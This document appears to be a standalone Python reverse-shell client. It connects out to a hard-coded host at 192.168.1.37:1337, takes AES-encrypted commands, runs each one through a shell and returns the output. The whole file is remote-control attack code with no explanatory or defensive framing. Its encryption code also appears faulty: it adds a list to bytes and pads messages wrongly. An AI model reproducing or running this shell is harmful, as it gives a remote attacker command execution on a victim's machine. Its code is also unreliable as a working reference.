
import socket
import subprocess
import time
from Crypto.Cipher import AES
import base64

# AES Encryption Setup
KEY = [71, 217, 251, 172, 62, 164, 205, 13, 114, 120, 11, 212, 199, 117, 138, 6]  # 16-byte key
IV = [181, 58, 152, 238, 53, 148, 148, 146, 19, 225, 189, 123, 67, 95, 132, 122]

def encrypt(msg):
    cipher = AES.new(bytes(KEY), AES.MODE_CBC, bytes(IV))
    return base64.b64encode(IV + cipher.encrypt(msg.ljust(16))).decode()

def decrypt(enc_msg):
    enc_msg = base64.b64decode(enc_msg)
    iv, enc_msg = enc_msg[:16], enc_msg[16:]
    cipher = AES.new(bytes(KEY), AES.MODE_CBC, iv)
    return cipher.decrypt(enc_msg).strip().decode()

# Connection Setup
HOST = "192.168.1.37"
PORT = 1337

def connect():
    for _ in range(20):  # Try for 20 seconds
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((HOST, PORT))

            while True:
                cmd = decrypt(client.recv(1024).decode())  # Receive & decrypt command
                if cmd.lower() == "exit":
                    break
                output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                client.send(encrypt(output.stdout + output.stderr).encode())  # Encrypt & send response

            client.close()
            break
        except:
            time.sleep(1)  # Wait 1 second before retrying

connect()
